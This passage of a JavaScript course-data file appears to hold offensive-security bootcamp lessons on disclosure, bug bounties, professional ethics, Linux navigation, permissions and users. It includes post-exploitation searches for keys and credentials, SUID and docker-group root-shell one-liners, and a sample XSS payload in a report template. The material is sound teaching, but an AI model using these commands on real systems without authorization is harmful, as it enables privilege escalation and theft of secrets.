**Exercise:** Draft a scope document for a fictional penetration test engagement. The target is a fictional e-commerce company called "ShopSafe Ltd" with the domain `shopsafe.co.uk`. Include: in-scope targets (make up realistic IP ranges and domains), out-of-scope targets, permitted techniques, testing window, data handling requirements, and emergency contact details. This exercise forces you to understand what every field in a scope document means and why it exists.`,
              image: '/assets/bootcamp/rooms/ethics-scope-authorization.jpg',
            },
            {
              title: 'Responsible Disclosure',
              instruction:
                `Responsible disclosure — also called coordinated disclosure — is the process of reporting a vulnerability to the affected organisation before making it public. The goal is to give the vendor or developer time to release a fix before the vulnerability becomes public knowledge that attackers can exploit.

**The standard responsible disclosure process:**

**Step 1 — Document the vulnerability thoroughly**

Before reporting anything, you need a complete technical record. This includes:
- A clear description of the vulnerability and its root cause
- The exact steps to reproduce it (a numbered list that anyone could follow)
- Proof that you reproduced it (screenshots, request/response captures, video)
- An assessment of the impact (what could an attacker do with this?)

**Step 2 — Identify the correct contact**

Many organisations have a published security contact:

\`\`\`bash
# Check for a security.txt file (RFC 9116 standard)
curl https://target.com/.well-known/security.txt
curl https://target.com/security.txt

# Common security email addresses to try:
# security@company.com
# psirt@company.com (Product Security Incident Response Team)
# vulnerability@company.com
# bugbounty@company.com

# Check the company's website for a "Security" or "Responsible Disclosure" page
# Many large companies publish their disclosure policy at:
# https://company.com/security
# https://company.com/responsible-disclosure
\`\`\`

**Step 3 — Write a clear, professional report**

Your report should include:
- Vulnerability summary (one paragraph)
- Affected URL, endpoint, or component
- Steps to reproduce (numbered, complete)
- Proof of concept (code, request, or screenshot)
- Impact assessment
- Suggested remediation

Do not include: threats, demands for payment, proof of accessing data you should not have, or any information that could be used to make the situation worse.

**Step 4 — Agree on a timeline**

The industry standard is 90 days — the time Google Project Zero pioneered for vendors to release a fix before public disclosure. When you report a vulnerability, propose this timeline explicitly.

\`\`\`
"I am disclosing this vulnerability under a 90-day coordinated disclosure 
policy. I intend to publish my findings on [DATE, 90 days from today] 
regardless of whether a patch has been released, in order to protect users 
who may be affected. I am happy to extend this deadline by 30 days if you 
can confirm active work on a fix."
\`\`\`

**Step 5 — Follow up**

If you receive no response within 7–14 days, follow up. If you still receive no response after 30 days, consider escalating through alternative channels (LinkedIn, company social media, or the relevant national CERT — for example, NCSC in the UK, CISA in the US).

**Step 6 — Publish after the deadline**

After the fix is released (or the deadline passes), you may publish your findings. A responsible disclosure writeup typically includes:
- A description of the vulnerability (now that it is patched)
- The timeline of your disclosure and the vendor's response
- Technical details and proof of concept
- Credit to anyone who assisted

**Bug bounty programmes:**

Bug bounty programmes formalise this process. The company publishes its scope, rules, and reward structure. You find vulnerabilities within the scope and report them through the platform. The rewards can be substantial:

| Severity | Typical range (varies by programme) |
|---|---|
| Critical | $5,000 – $100,000+ |
| High | $1,000 – $15,000 |
| Medium | $250 – $3,000 |
| Low | $50 – $500 |
| Informational | $0 – $100 |

Always read the programme rules before testing. Some programmes have specific restrictions (e.g. no automated scanning, no social engineering) that go beyond what the law permits.

**Exercise:** Document the full responsible disclosure process in your notes. Then answer this question in writing: You report a critical vulnerability to a company. They acknowledge receipt, then go silent for 45 days. You follow up twice with no response. What are your options? What would you do, and why?`,
              image: '/assets/bootcamp/rooms/ethics-responsible-disclosure.jpg',
            },
            {
              title: 'Bug Bounty Platforms and Getting Started',
              instruction:
                `Bug bounty platforms are the bridge between your skills and your first real-world security findings. Understanding how they work, how to choose a programme, and how to write a report that gets paid is essential knowledge before you start hunting.

**The major platforms:**

**HackerOne (hackerone.com)**
The largest bug bounty platform. Hosts programmes for companies including Google, Microsoft, Twitter, Shopify, and the US Department of Defense. Has a public vulnerability disclosure database you can study to learn what accepted findings look like.

**Bugcrowd (bugcrowd.com)**
Second largest platform. Strong presence in the financial services and healthcare sectors. Also runs Vulnerability Disclosure Programmes (VDPs) — programmes that accept reports but do not offer monetary rewards.

**Intigriti (intigriti.com)**
Europe-based platform with strong coverage of European companies. GDPR-compliant handling of reported data.

**Yeswehack (yeswehack.com)**
French-based platform, strong European presence.

**Synack (synack.com)**
Invite-only, vetted researcher community. Higher-quality programmes, often with higher payouts. Requires passing a technical assessment to join.

**Choosing your first programme:**

\`\`\`
When starting out, look for programmes with:

1. A broad scope — more targets = more opportunities
2. A high volume of disclosed reports — study them to learn what findings 
   look like, what gets accepted, and what gets rejected
3. Responsive triage — look at the programme's response time statistics
4. Clear rules — well-defined scope and restrictions reduce wasted effort

Start with VDPs (no rewards) to build confidence, then move to paid programmes.
Never start on a highly competitive programme with a narrow scope — most 
low-hanging fruit will already have been found.
\`\`\`

**Reading public disclosures to learn:**

\`\`\`bash
# HackerOne public disclosures are one of the best free learning resources
# available. Browse them at:
https://hackerone.com/hacktivity

# Filter by:
# - Vulnerability type (e.g. XSS, IDOR, SSRF)
# - Bounty amount (sort by highest paid to find impactful findings)
# - Programme (study specific companies you want to target)

# For each disclosed report, study:
# - What the vulnerability was
# - How the researcher found it
# - What payload or technique they used
# - How they wrote the report
# - How much it paid and why
\`\`\`

**Writing a report that gets paid:**

A report that gets rejected is wasted work. The difference between accepted and rejected reports is almost always report quality, not finding quality. A mediocre finding with a brilliant report often earns more than a critical finding with a poor one.

Every report must include:

\`\`\`
Title: [Vulnerability type] in [component/endpoint] allows [impact]
       Example: "Stored XSS in profile bio field allows session 
                hijacking of any user viewing the profile"

Severity: Critical / High / Medium / Low / Informational
          Justify your choice with CVSS components if possible.

Summary: One paragraph. What is the vulnerability? Where is it? What 
         can an attacker do with it?

Steps to Reproduce:
1. Log in as any user
2. Navigate to Profile → Edit
3. In the Bio field, enter: <img src=x onerror=alert(document.cookie)>
4. Save the profile
5. Log in as a different user and view the first user's profile
6. Observe: the second user's cookies are sent to the attacker's server

Impact: Be specific. "An attacker can steal session cookies from any 
        user who views a vulnerable profile, enabling account takeover 
        without requiring the victim's password."

Supporting Material: Screenshots, HTTP request/response captures, 
                     screen recordings, or PoC code.
\`\`\`

**Exercise:** Find three public disclosures on HackerOne's hacktivity feed for the same vulnerability type (e.g. three XSS reports). Compare them: how did each researcher find it? How did each researcher describe the impact? What made one report better than another? Write a one-page analysis of what you learned about effective vulnerability reporting.`,
              image: null,
            },
            {
              title: 'Professional Standards and the Operator\'s Code',
              instruction:
                `Beyond the legal framework, the offensive security profession has a set of professional standards — unwritten expectations that govern how operators behave. Violating these standards does not always result in criminal charges, but it will end your career.

**Confidentiality**

Everything you discover during an engagement is confidential. This includes the fact that you were engaged to test the organisation at all. You do not discuss client engagements publicly, on social media, with friends, or with other clients. You do not use findings from one client's engagement to inform your testing of another.

\`\`\`
What this means practically:
- Do not post screenshots of client vulnerabilities on Twitter, even without the domain
- Do not mention the client's name when talking about an engagement, even vaguely
- Do not store client data on personal devices or cloud services without explicit permission
- When an engagement ends, delete or return all data as specified in the scope document
\`\`\`

**Data minimisation**

Collect only what you need to prove the vulnerability exists. If you find a SQL injection that exposes a database of 500,000 customer records, you do not need to extract all 500,000 records to prove the vulnerability is real. Extract the minimum — typically a handful of rows — to document the impact. Extracting more than necessary creates legal liability and is ethically indefensible.

**Avoid collateral damage**

Your testing should not impact systems or people who are not part of the engagement. This means:

\`\`\`bash
# Before running any scan, ask: could this affect systems outside my scope?
# Before running any exploit, ask: could this crash the system or corrupt data?
# Before testing denial-of-service conditions, ask: is this explicitly permitted?

# Timing matters:
# Run intrusive tests during agreed windows (typically off-business hours)
# Avoid running heavy scans during peak traffic periods without client agreement

# Rate limiting your tools:
nmap --max-rate 100 target.com   # Limit to 100 packets/second
gobuster dir -u http://target.com -t 5  # Limit to 5 threads
\`\`\`

**Immediate disclosure of critical risks**

If you discover evidence of an existing breach — a third-party actor has already compromised the system — you must report it immediately to the client, even if it disrupts your testing. The same applies if you find a vulnerability so critical that exploitation is imminent (e.g. an unauthenticated RCE exposed to the public internet). Do not wait for the end-of-engagement report.

**Honesty in reporting**

You report what you find — not what the client wants to hear. If the security posture is poor, the report says so. If you did not find significant vulnerabilities, you say that too — you do not invent findings to justify your fee. A penetration test report with no significant findings is a valid and valuable result: it tells the client their defences held up against a professional test.

**Exercise:** Read the CREST Code of Conduct (crest-approved.org) and the Offensive Security certification holder agreement (if available). Write a one-page personal code of conduct for your practice as an operator. Include at least eight specific commitments, grounded in real scenarios. Sign it with your name and date. Keep it in your notes and return to it periodically.`,
              image: null,
            },
          ],
        },
      ],
    },

    // ═══════════════════════════════════════════════════════════════════════════
    // PHASE 2 — LINUX FOUNDATIONS
    // ═══════════════════════════════════════════════════════════════════════════
    {
      id: 'phase2',
      title: 'Linux Foundations',
      codename: 'PHASE 2',
      rooms: [

        // ── Room 1 ─────────────────────────────────────────────────────────────
        {
          id: 'room1',
          title: 'Linux Basics & Navigation',
          overview:
            'Linux is the operating system of offensive security. Nearly every tool you will use runs on Linux, and most targets run Linux servers. This room builds the terminal fluency you need to operate effectively — from navigating the filesystem to reading file permissions and searching content efficiently.',
          estimatedMinutes: 40,
          steps: [
            {
              title: 'The Terminal and the Filesystem',
              instruction:
                `The terminal is your primary interface as an operator. Unlike a graphical file manager, the terminal gives you direct, scriptable, reproducible access to every part of the system. Every action you take in a terminal can be logged, automated, and repeated exactly. This is essential both for your own work and for producing reproducible proof of concept steps in your reports.

**The Linux filesystem hierarchy:**

Linux organises everything under a single root directory: `/`. Every file, directory, device, and process is accessible from this root. Understanding what lives where tells you where to look during post-exploitation enumeration.

| Directory | Contents | Why it matters to operators |
|---|---|---|
| `/` | Root of the entire filesystem | Starting point for all paths |
| `/home` | User home directories | Where users store files, config, SSH keys |
| `/root` | Root user's home directory | High-value target — check for credentials, keys, history |
| `/etc` | System configuration files | Password files, service configs, cron jobs, network config |
| `/var` | Variable data: logs, databases, mail | Logs reveal what happened; databases hold application data |
| `/var/log` | System and application logs | Auth logs, web server logs, application logs |
| `/tmp` | Temporary files | World-writable — common target for privilege escalation |
| `/dev` | Device files | Everything is a file in Linux — disks, terminals, random |
| `/proc` | Virtual filesystem exposing kernel data | Running processes, memory maps, system configuration |
| `/sys` | Virtual filesystem for hardware info | Hardware configuration accessible as files |
| `/bin` | Essential binaries (all users) | Core commands: ls, cat, cp, mv, rm |
| `/usr/bin` | Non-essential binaries (all users) | Most installed tools live here |
| `/sbin`, `/usr/sbin` | System administration binaries | Commands typically requiring root |
| `/opt` | Optional / third-party software | Custom-installed applications, sometimes poorly secured |
| `/srv` | Data served by the system | Web server content, FTP files |

**Essential first commands:**

\`\`\`bash
# Show your current working directory (where you are right now)
pwd

# List all files including hidden ones (.dotfiles), with details
ls -la

# List with human-readable file sizes
ls -lah

# List the root of the filesystem — understand the full hierarchy
ls -la /

# List your home directory explicitly
ls -la ~

# List a specific directory without navigating into it
ls -la /etc/

# Show the full directory tree (install if missing: sudo apt install tree)
tree /etc -L 2

# Show file sizes sorted by size (largest first)
du -sh /var/* 2>/dev/null | sort -rh | head -20

# Count how many files are in a directory
ls /etc/ | wc -l
\`\`\`

**Hidden files and directories:**

In Linux, any file or directory whose name begins with a dot (`.`) is hidden from a standard `ls` listing. Hidden files are frequently used to store configuration and credentials:

\`\`\`bash
# Show hidden files in your home directory
ls -la ~/

# Common hidden files/directories to check during post-exploitation:
ls -la ~/.bash_history      # Command history — often contains credentials
ls -la ~/.ssh/              # SSH keys — private keys are gold
ls -la ~/.bashrc            # Shell configuration — may contain aliases/vars
ls -la ~/.profile           # Login shell configuration
ls -la ~/.config/           # Application configuration directory
ls -la ~/.local/            # User-local application data
ls -la ~/.gnupg/            # GPG keys
ls -la ~/.aws/              # AWS credentials — extremely common finding
ls -la ~/.docker/config.json  # Docker registry credentials
\`\`\`

**Exercise:** Navigate to `/etc` using the terminal. Run `ls -la`. In your notes, draw the directory structure you see (at least two levels deep). Mark which directories and files you think would be most interesting to an attacker who has just gained a low-privileged shell — and explain why for each one.`,
              image: '01-terminal.png',
            },
            {
              title: 'Navigating the Filesystem',
              instruction:
                `Efficient navigation is a core skill. You should be able to move anywhere in the filesystem without hesitation. More importantly, you should understand where to go instinctively during an engagement — because every second spent fumbling through directories is a second the blue team has to detect you.

**Navigation commands:**

\`\`\`bash
# Move into a directory
cd /etc

# Go up one level to the parent directory
cd ..

# Go up two levels
cd ../..

# Go to your home directory (both are equivalent)
cd ~
cd

# Go to the previous directory (extremely useful — toggles between two locations)
cd -

# Show your current location
pwd

# Navigate using an absolute path (from root /)
cd /var/log/apache2

# Navigate using a relative path (from current location)
# If you are in /var, this takes you to /var/log/apache2:
cd log/apache2
\`\`\`

**Listing and searching:**

\`\`\`bash
# List with detailed information
ls -la

# List sorted by modification time (newest first)
ls -lt

# List sorted by modification time (oldest first) — useful for finding old files
ls -ltr

# List recursively (all subdirectories)
ls -laR /etc/ 2>/dev/null

# Find files by name across the entire filesystem
find / -name "passwd" 2>/dev/null

# Find files by name (case-insensitive)
find / -iname "password*" 2>/dev/null

# Find files modified in the last 24 hours
find /etc -mtime -1 2>/dev/null

# Find files modified in the last 7 days
find /var/log -mtime -7 2>/dev/null

# Find files larger than 10MB
find / -size +10M 2>/dev/null

# Find files with a specific extension
find / -name "*.conf" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name ".htpasswd" 2>/dev/null

# Find files containing a specific string in their name
find / -name "*backup*" 2>/dev/null
find / -name "*cred*" 2>/dev/null
find / -name "*secret*" 2>/dev/null
find / -name "*password*" 2>/dev/null
\`\`\`

**The `2>/dev/null` explained:**

This redirects standard error (stderr, file descriptor 2) to `/dev/null`, which is a black hole — anything written to it is discarded. When you run `find` across the whole filesystem, you will encounter many "Permission denied" errors for directories you cannot read. These error messages clutter your output. Redirecting them to `/dev/null` keeps your output clean.

\`\`\`bash
# Without redirection — messy:
find / -name "*.conf"
# find: '/proc/tty/driver': Permission denied
# find: '/root': Permission denied
# /etc/nginx/nginx.conf
# /etc/ssh/sshd_config
# ...

# With redirection — clean:
find / -name "*.conf" 2>/dev/null
# /etc/nginx/nginx.conf
# /etc/ssh/sshd_config
# ...
\`\`\`

**Building efficient find commands for post-exploitation:**

\`\`\`bash
# Find all configuration files — high value for credentials and service info
find /etc /opt /var/www -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null

# Find all shell scripts — may contain hardcoded credentials
find / -name "*.sh" -type f 2>/dev/null

# Find recently modified files — may indicate recent attacker activity or updates
find / -newer /etc/passwd -type f 2>/dev/null

# Find files owned by a specific user
find / -user www-data -type f 2>/dev/null

# Find files owned by no user (orphaned — common after user deletion)
find / -nouser -type f 2>/dev/null
\`\`\`

**Exercise:** From the terminal, navigate to `/etc`, then to `/var/log`, then back to your home directory without using `cd ~` or `cd` alone. Use only relative paths and `cd -`. Run `pwd` after each move to confirm your location. Time yourself — the goal is to navigate three directory levels in under 30 seconds without hesitation.`,
              image: '02-navigate.png',
            },
            {
              title: 'Understanding File Permissions',
              instruction:
                `Every file and directory in Linux has a permission string. Reading permissions fluently is essential — for understanding what you can access as a low-privileged user, for identifying misconfigurations that allow privilege escalation, and for correctly documenting findings in your reports.

**Reading the permission string:**

When you run `ls -la`, each line looks like this:

\`\`\`bash
-rwxr-xr-x  1  root  root   4096  Jan 01 12:00  /bin/bash
drwxr-xr-x  2  alice alice  4096  Jan 01 12:00  /home/alice
-rw-------  1  alice alice   220  Jan 01 12:00  /home/alice/.bash_history
lrwxrwxrwx  1  root  root      7  Jan 01 12:00  /bin/sh -> /bin/dash
\`\`\`

The permission string has 10 characters:

| Position | Meaning | Values |
|---|---|---|
| 1 | File type | `-` file, `d` directory, `l` symlink, `b` block device, `c` char device, `p` named pipe, `s` socket |
| 2–4 | Owner (user) permissions | `r` read, `w` write, `x` execute, `-` none |
| 5–7 | Group permissions | `r` read, `w` write, `x` execute, `-` none |
| 8–10 | World (everyone) permissions | `r` read, `w` write, `x` execute, `-` none |

**What each permission means for files vs directories:**

| Permission | On a file | On a directory |
|---|---|---|
| `r` | Read file contents | List directory contents (`ls`) |
| `w` | Modify file contents | Create, delete, rename files within the directory |
| `x` | Execute the file as a program | Enter the directory (`cd`) and access its contents |

**Numeric (octal) notation:**

Each permission triplet maps to a number:
- `r` = 4, `w` = 2, `x` = 1, `-` = 0
- Add the values: `rwx` = 4+2+1 = **7**, `rw-` = 4+2+0 = **6**, `r-x` = 4+0+1 = **5**, `r--` = 4+0+0 = **4**

\`\`\`bash
# Permission 755 means: owner=rwx(7), group=r-x(5), world=r-x(5)
# Permission 644 means: owner=rw-(6), group=r--(4), world=r--(4)
# Permission 600 means: owner=rw-(6), group=---(0), world=---(0)
# Permission 777 means: everyone has rwx — a common misconfiguration
\`\`\`

**SUID, SGID, and Sticky Bit — critical for privilege escalation:**

Beyond the basic permissions, three special bits have significant security implications:

\`\`\`bash
# SUID (Set User ID) — file runs with the owner's privileges, not the caller's
# Shown as 's' in the owner execute position: -rwsr-xr-x
# If owned by root: any user who runs this file gets root-level operations
sudo find / -perm -4000 -type f 2>/dev/null

# SGID (Set Group ID) — file runs with the group's privileges
# Shown as 's' in the group execute position: -rwxr-sr-x
sudo find / -perm -2000 -type f 2>/dev/null

# Sticky Bit — on directories, only the owner can delete their own files
# Shown as 't' in the world execute position: drwxrwxrwt
# Example: /tmp has the sticky bit set so users cannot delete each other's files
ls -la /tmp

# Find world-writable files (any user can modify these)
find / -perm -o+w -type f 2>/dev/null | grep -v proc

# Find world-writable directories (any user can create/delete files here)
find / -perm -o+w -type d 2>/dev/null | grep -v proc
\`\`\`

**Common privilege escalation via SUID binaries:**

\`\`\`bash
# After running the SUID search, check each binary against GTFOBins:
# https://gtfobins.github.io

# Example: if /usr/bin/find has the SUID bit set:
/usr/bin/find . -exec /bin/sh -p \; -quit
# This spawns a shell running as the owner of find (likely root)

# Example: if /usr/bin/vim has the SUID bit set:
/usr/bin/vim -c ':!/bin/sh'

# Example: if /usr/bin/cp has the SUID bit set:
# You can overwrite /etc/passwd with a modified version
\`\`\`

**Exercise:** Run the SUID search command on your Kali machine and your target machine. For every result, look up the binary on GTFOBins. Document: the binary name, the owner, and whether GTFOBins lists a privilege escalation technique for it. Write down what that technique involves, step by step.`,
              image: '03-permissions.png',
            },
            {
              title: 'Reading Files and Searching Content',
              instruction:
                `Reading and searching file content is something you will do constantly during enumeration and post-exploitation. Mastering these tools lets you quickly find credentials, configuration details, and indicators of compromise across an entire filesystem.

**Viewing file contents:**

\`\`\`bash
# Print entire file to terminal (good for small files)
cat /etc/passwd

# Print with line numbers
cat -n /etc/passwd

# Print with non-printing characters shown (reveals hidden characters)
cat -A /etc/hosts

# Read file page by page (press q to quit, space for next page, / to search)
less /etc/passwd

# Show first 10 lines
head /etc/passwd

# Show first 20 lines
head -n 20 /etc/passwd

# Show last 10 lines (useful for logs — most recent entries are at the bottom)
tail /var/log/auth.log

# Show last 50 lines
tail -n 50 /var/log/auth.log

# Follow a log file in real time (press Ctrl+C to stop)
tail -f /var/log/auth.log

# Follow multiple log files simultaneously
tail -f /var/log/auth.log /var/log/syslog

# Display file contents in hex (useful for binary files)
xxd /bin/bash | head -20
hexdump -C /bin/bash | head -20
\`\`\`

**Searching with grep:**

`grep` is one of the most powerful tools in your arsenal. It searches for patterns within files.

\`\`\`bash
# Basic search — find "root" in /etc/passwd
grep "root" /etc/passwd

# Case-insensitive search
grep -i "password" /etc/passwd

# Show line numbers with matches
grep -n "root" /etc/passwd

# Show only the matching part (not the whole line)
grep -o "root" /etc/passwd

# Invert match — show lines that do NOT match
grep -v "nologin" /etc/passwd

# Search recursively in a directory
grep -r "password" /etc/ 2>/dev/null

# Recursive, case-insensitive search
grep -ri "password" /etc/ 2>/dev/null

# Show 2 lines of context above and below the match
grep -A 2 -B 2 "root" /etc/passwd

# Show 3 lines after the match
grep -A 3 "password" /etc/nginx/nginx.conf

# Count matching lines
grep -c "Failed" /var/log/auth.log

# List only filenames that contain a match (not the matches themselves)
grep -rl "password" /etc/ 2>/dev/null

# Search for multiple patterns (OR)
grep -E "password|secret|key|token|credential" /etc/nginx/sites-enabled/* 2>/dev/null

# Search for a pattern at the start of a line
grep "^root" /etc/passwd

# Search for a pattern at the end of a line
grep "bash$" /etc/passwd
\`\`\`

**High-value grep searches during post-exploitation:**

\`\`\`bash
# Find hardcoded credentials in configuration files
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null
grep -ri "db_pass" /var/www/ 2>/dev/null
grep -ri "DB_PASSWORD" /var/www/ 2>/dev/null
grep -ri "api_key" /var/www/ 2>/dev/null
grep -ri "secret_key" /var/www/ 2>/dev/null
grep -ri "aws_secret" /var/www/ 2>/dev/null

# Find connection strings (database credentials)
grep -ri "jdbc:" /opt/ 2>/dev/null
grep -ri "mysql://" /var/www/ 2>/dev/null
grep -ri "postgresql://" /var/www/ 2>/dev/null

# Find private keys
grep -rl "PRIVATE KEY" / 2>/dev/null
grep -rl "BEGIN RSA" / 2>/dev/null

# Find users with interactive shells
grep -v "nologin\|false" /etc/passwd

# Find failed SSH login attempts
grep "Failed password" /var/log/auth.log

# Find successful SSH logins
grep "Accepted password\|Accepted publickey" /var/log/auth.log

# Find sudo usage
grep "sudo" /var/log/auth.log
\`\`\`

**Exercise:** On your Kali machine, run the high-value grep searches against `/etc/` and `/var/www/` (if it exists). Document every result that could be considered sensitive information. For each result, write one sentence explaining what the information reveals and how an attacker could use it.`,
              image: '04-reading.png',
            },
            {
              title: 'Text Processing and Output Manipulation',
              instruction:
                `Effective operators do not just read raw output — they process it. These tools let you filter, sort, count, and transform command output to extract exactly the information you need quickly. On a time-pressured engagement, these skills save hours.

**Core text processing tools:**

\`\`\`bash
# cut — extract specific fields from delimited output
# The /etc/passwd file is colon-delimited. Get just the username (field 1):
cut -d: -f1 /etc/passwd

# Get username (1) and shell (7):
cut -d: -f1,7 /etc/passwd

# Get the first 20 characters of each line:
cut -c1-20 /etc/passwd

# awk — more powerful field processing
# Print username and home directory from /etc/passwd:
awk -F: '{print $1, $6}' /etc/passwd

# Print only lines where the UID (field 3) is 0 (root accounts):
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Print only lines where the UID is >= 1000 (regular user accounts):
awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd

# Print the total number of users:
awk -F: 'END {print NR " total users"}' /etc/passwd

# sed — stream editor for substitution and transformation
# Replace text in output (not in file):
cat /etc/passwd | sed 's/bash/zsh/g'

# Delete lines matching a pattern:
cat /etc/passwd | sed '/nologin/d'

# Print only lines 5 through 10:
sed -n '5,10p' /etc/passwd

# sort — sort lines
# Sort /etc/passwd alphabetically by username:
sort /etc/passwd

# Sort numerically by UID (field 3):
sort -t: -k3 -n /etc/passwd

# Sort in reverse:
sort -t: -k3 -rn /etc/passwd

# uniq — filter duplicate lines (input must be sorted first)
# Count how many times each shell appears in /etc/passwd:
cut -d: -f7 /etc/passwd | sort | uniq -c | sort -rn

# wc — word, line, and character count
# Count lines in a file:
wc -l /etc/passwd

# Count words:
wc -w /etc/passwd

# Count characters:
wc -c /etc/passwd

# tr — translate or delete characters
# Convert lowercase to uppercase:
echo "hello world" | tr 'a-z' 'A-Z'

# Remove all spaces:
echo "hello world" | tr -d ' '

# Replace colons with tabs (useful for /etc/passwd):
cat /etc/passwd | tr ':' '\t'

# tee — read from stdin and write to both stdout and a file simultaneously
# Save nmap output and display it at the same time:
nmap 192.168.1.1 | tee nmap_results.txt
\`\`\`

**Chaining tools with pipes:**

The real power comes from chaining these tools together:

\`\`\`bash
# Get a sorted, unique list of all shells used on the system:
cut -d: -f7 /etc/passwd | sort -u

# Get all users with UID >= 1000 (regular users), sorted alphabetically:
awk -F: '$3 >= 1000 {print $1}' /etc/passwd | sort

# Count failed SSH login attempts per IP address (from auth log):
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | \
  sort | \
  uniq -c | \
  sort -rn | \
  head -10

# Find the top 10 most frequent commands in bash history:
cat ~/.bash_history | sort | uniq -c | sort -rn | head -10

# List all open ports and the process using each:
ss -tulnp | awk 'NR>1 {print $5, $7}' | sort

# Extract all IP addresses from a log file:
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' /var/log/auth.log | \
  sort | uniq -c | sort -rn
\`\`\`

**Exercise:** Using only the command-line tools covered in this step, answer the following questions about your Kali machine without opening any GUI applications:
1. How many user accounts have `/bin/bash` as their shell?
2. What is the username of the account with UID 1000?
3. How many files are in `/etc/` (not counting subdirectories)?
4. What is the most recently modified file in `/var/log/?
Write the exact command you used for each answer.`,
              image: null,
            },
            {
              title: 'The Linux Manual and Getting Help',
              instruction:
                `One of the most important skills you will develop is knowing how to find the answer yourself. The Linux manual system contains detailed documentation for every command on the system. Operators who use man pages read tool documentation at the operator level — not the tool-runner level.

**The man command:**

\`\`\`bash
# Read the manual for a command
man ls
man find
man grep
man nmap

# Navigate within man pages:
# Space or PageDown — next page
# b or PageUp — previous page
# / — search forward for a pattern
# n — next search result
# N — previous search result
# q — quit

# Search across all man pages for a keyword
man -k password
man -k network
man -k encrypt

# Get a one-line description of a command
whatis ls
whatis find
whatis nmap

# Show where a command is installed
which nmap
which python3
which bash

# Show all locations of a command
whereis nmap

# Show command history
type ls    # Shows if it's a shell builtin, alias, or external command
\`\`\`

**Reading man page sections:**

Man pages are divided into sections. The most relevant to operators:

| Section | Content |
|---|---|
| 1 | User commands (most tools: nmap, ls, find) |
| 2 | System calls (read, write, open) |
| 5 | File formats and conventions (/etc/passwd, /etc/crontab) |
| 8 | System administration commands (sudo, mount, iptables) |

\`\`\`bash
# Read the man page for /etc/passwd format (section 5)
man 5 passwd

# Read the man page for the crontab file format
man 5 crontab

# Read the man page for iptables (section 8)
man 8 iptables
\`\`\`

**Other help mechanisms:**

\`\`\`bash
# Most tools have a built-in help flag
nmap --help
gobuster --help
hydra -h
sqlmap --help | less

# Some tools use -h, some use --help, some use help as a subcommand
git help
docker help
kubectl help

# Python modules often have help() built in
python3 -c "import hashlib; help(hashlib)"

# Info pages (more detailed than man pages for GNU tools)
info ls
info grep

# Online documentation — always check the official docs
# For tools on Kali: https://tools.kali.org/tools-listing
# For nmap: https://nmap.org/book/man.html
# For Metasploit: https://docs.metasploit.com
\`\`\`

**Using help efficiently during an engagement:**

\`\`\`bash
# You remember nmap has a timing flag but cannot remember the syntax:
man nmap | grep -A5 "timing"
nmap --help | grep -i timing

# You want to know all nmap script categories:
man nmap | grep -A2 "script-categories"

# You need to find every flag that controls output format:
nmap --help | grep -i output

# You want to understand a specific find flag:
man find | grep -A3 "\-mtime"
\`\`\`

**Exercise:** Using only man pages and --help flags (no Google), answer the following questions:
1. What nmap flag enables OS detection?
2. What flag does `find` use to search by file owner?
3. What grep flag shows the filename but not the matching line?
4. What flag does `ss` use to show only UDP sockets?

Write the exact man page section and flag for each answer. This exercise trains you to extract information from documentation quickly — a skill that pays dividends throughout your career.`,
              image: null,
            },
          ],
        },

        // ── Room 2 ─────────────────────────────────────────────────────────────
        {
          id: 'room2',
          title: 'Users, Groups & Permissions',
          overview:
            'Access control is the foundation of system security. Understanding how Linux manages users, groups, and privileges is essential for both attacking and defending systems, and is the prerequisite for every privilege escalation technique you will learn in this bootcamp.',
          estimatedMinutes: 40,
          steps: [
            {
              title: 'Users and Identity',
              instruction:
                `Every process on Linux runs as a user. Every file is owned by a user. The user model is the fundamental security boundary — when you gain access to a system, the first question you ask is "who am I?" because it determines everything you can and cannot do.

**Identifying yourself:**

\`\`\`bash
# Show your current user, UID, GID, and all group memberships
id

# Show just your username
whoami

# Show your effective user (important after privilege escalation)
id -u && id -un

# Show all users currently logged in
who

# Show all logged-in users with idle time and process info
w

# Show last login history for all users
last

# Show last login for a specific user
last alice

# Show failed login attempts (requires root or adm group membership)
lastb

# Show last time each user logged in
lastlog

# Show your login shell
echo $SHELL

# Show your home directory
echo $HOME

# Show all environment variables (often contains credentials or tokens)
env
printenv
\`\`\`

**Understanding the `id` output:**

\`\`\`bash
# Example output:
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),27(sudo),1001(docker),1002(wireshark)

# uid=1000 — User ID. 0=root, 1-999=system accounts, 1000+=regular users
# gid=1000 — Primary Group ID
# groups=... — All supplementary groups this user belongs to
\`\`\`

**What group membership tells an attacker:**

\`\`\`bash
# Check what each group grants — this is critical for PrivEsc assessment

# sudo — can run commands as root (check sudo -l for exact permissions)
groups | grep sudo

# adm — can read system log files (/var/log/)
groups | grep adm
ls -la /var/log/auth.log  # adm group can read this

# docker — can escape containers to root
# ANY user in the docker group can escalate to root:
groups | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# This mounts the entire host filesystem and drops into a root shell

# lxd — similar container escape as docker
groups | grep lxd

# disk — direct read/write access to physical disks
# Can read the entire filesystem even without file permissions
groups | grep disk

# shadow — can read /etc/shadow (password hashes)
groups | grep shadow

# video — can capture screen contents via framebuffer
groups | grep video
\`\`\`

**Switching users:**

\`\`\`bash
# Switch to root (requires root password or sudo)
su -
su root

# Switch to another user
su alice

# Switch to another user without changing environment
su -s /bin/bash alice

# Run a single command as another user
su -c "whoami" alice

# Check if you can switch without a password (misconfiguration)
su -c "id" root 2>/dev/null
\`\`\`

**Exercise:** Run `id` on your system. For every group you are a member of, write a paragraph explaining what access that group grants and whether it could be used for privilege escalation. Look up each group on GTFOBins or Linux post-exploitation checklists if you are unsure.`,
              image: '01-id.png',
            },
            {
              title: 'The passwd and shadow Files',
              instruction:
                `Two files are critical for understanding user accounts on a Linux system: `/etc/passwd` and `/etc/shadow`. Understanding their structure tells you everything about the accounts on a system, and understanding their permissions tells you whether credential extraction is possible.

**The `/etc/passwd` file:**

\`\`\`bash
# View the passwd file — readable by all users
cat /etc/passwd

# Get just usernames (field 1)
cut -d: -f1 /etc/passwd

